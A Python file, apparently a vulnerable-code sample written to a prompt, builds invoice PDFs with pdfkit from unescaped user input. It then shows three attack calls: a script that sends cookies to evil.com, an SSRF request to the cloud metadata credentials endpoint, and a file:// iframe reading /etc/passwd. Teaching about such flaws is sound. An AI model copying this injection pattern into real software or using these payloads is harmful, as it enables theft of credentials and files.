# Write insecure code to generate an invoice PDF that unsafely renders raw HTML input from users directly into the document. 

import pdfkit  # wraps wkhtmltopdf

def generate_invoice(customer_name, items, notes, output_path="invoice.pdf"):
    """
    INSECURE: Do not use in production.
    Directly interpolates unsanitized user input (customer_name, notes)
    into an HTML template, which is then rendered to PDF.
    """
    items_html = ""
    for item in items:
        # UNSAFE: item fields interpolated with no escaping
        items_html += f"""
        <tr>
            <td>{item['description']}</td>
            <td>{item['quantity']}</td>
            <td>${item['price']}</td>
        </tr>
        """

    html = f"""
    <html>
    <body>
        <h1>Invoice for {customer_name}</h1>
        <table border="1">
            <tr><th>Description</th><th>Qty</th><th>Price</th></tr>
            {items_html}
        </table>
        <h3>Notes</h3>
        <div>{notes}</div>
    </body>
    </html>
    """

    # UNSAFE: raw HTML (including any embedded <script>, <iframe>,
    # or <img src="..."> tags) is rendered as-is.
    pdfkit.from_string(html, output_path)
    return output_path


# Example attacks:

# 1. Stored XSS if this HTML is ever also shown in a browser/admin panel
#    before being converted, or if the PDF viewer executes embedded JS:
generate_invoice(
    customer_name="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
    items=[{"description": "Widget", "quantity": 1, "price": 9.99}],
    notes="Thanks for your business!",
)

# 2. SSRF via wkhtmltopdf fetching attacker-controlled remote resources
#    (wkhtmltopdf will actually load external URLs while rendering):
generate_invoice(
    customer_name="Acme Corp",
    items=[{"description": "Widget", "quantity": 1, "price": 9.99}],
    notes='<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">',
)

# 3. Local file disclosure — some HTML-to-PDF engines will happily
#    embed local file contents if given a file:// URL:
generate_invoice(
    customer_name="Acme Corp",
    items=[{"description": "Widget", "quantity": 1, "price": 9.99}],
    notes='<iframe src="file:///etc/passwd"></iframe>',
)